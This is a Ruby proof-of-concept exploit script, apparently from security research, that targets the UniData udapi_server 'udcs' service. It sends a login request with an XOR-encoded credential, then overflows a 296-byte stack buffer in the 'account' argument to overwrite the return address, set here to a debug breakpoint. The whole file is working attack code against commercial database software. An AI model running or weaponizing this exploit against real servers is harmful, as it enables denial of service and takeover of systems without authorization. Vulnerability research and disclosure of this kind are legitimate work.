# Encoding: ASCII-8BIT

require 'base64'
require 'pp'

require_relative './libneptune'

def usage
  puts "Usage: #{ $0 } <host> [port]"
  puts
  puts "Eg:"
  puts
  puts "ruby #{ $0 } 10.0.0.198 31438"
  exit
end

HOST = ARGV[0] || usage()
PORT = ARGV[1] || "31438"

COMMS_VERSION = 4
RETURN_ADDRESS = 0x4007b0 # This is just a debug breakpoint

# Connect to the target
connection = LibNeptune::new(HOST, PORT)

# udcs /home/ron/unidata/unidata/bin/udapi_server * TCP/IP 0 3600
# defcs /home/ron/unidata/unidata/bin/udapi_server * TCP/IP 0 3600
# uddaps /home/ron/unidata/unidata/bin/udapi_server * TCP/IP 0 3600
pp connection.send_recv(
  args: [
    # Service name
    { type: :string, value: 'udcs' },

    # "SSL Flag" - must be non-zero if the service is started in "secure-only" mode (-s)
    { type: :integer, value: 0 },
  ],
)


# I think this is "login_as_user"
pp connection.send_recv(
  args: [
    # comms_version (Used as an "encryption" key for the password)
    # Must be 2, 3, or 4
    { type: :integer, value: COMMS_VERSION },

    # Must be ??? (I think another version? 5 works)
    { type: :integer, value: 5 },

    # This must be the "bytes" type, other types will crash with null pointer
    { type: :bytes, value: "testtest::local:" },

    # Must be XOR'd by the value in the first argument
    { type: :bytes, value: ('root:0:1234').bytes.map { |b| (0x0FF & (b ^ COMMS_VERSION)).chr }.join },

    # arg5
    # I think this is an "account"
    # *** Stack buffer overflow @ 296 bytes
    { type: :bytes, value: ('A'*296) + [RETURN_ADDRESS].pack('Q*')},
  ],
)
